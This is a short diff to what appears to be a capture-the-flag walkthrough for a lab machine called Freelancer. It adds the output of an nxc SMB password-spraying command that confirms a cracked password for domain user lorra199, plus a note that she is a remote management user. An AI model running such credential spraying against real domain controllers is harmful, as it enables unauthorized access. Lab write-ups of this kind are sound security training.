@@ -651,6 +651,16 @@ This looks like a password
 ```python
 nxc smb dc.freelancer.htb -u users.txt -p 'PWN3D#l0rr@Armessa199' --continue-on-success
 
-
+SMB         10.129.66.164   445    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 
 ```
+
+This user is compromised!
+
+# Enumeration of `lorra199`
+
+![](Pasted%20image%2020261003161545.png)
+
+She is part of remote management users
+
+
 
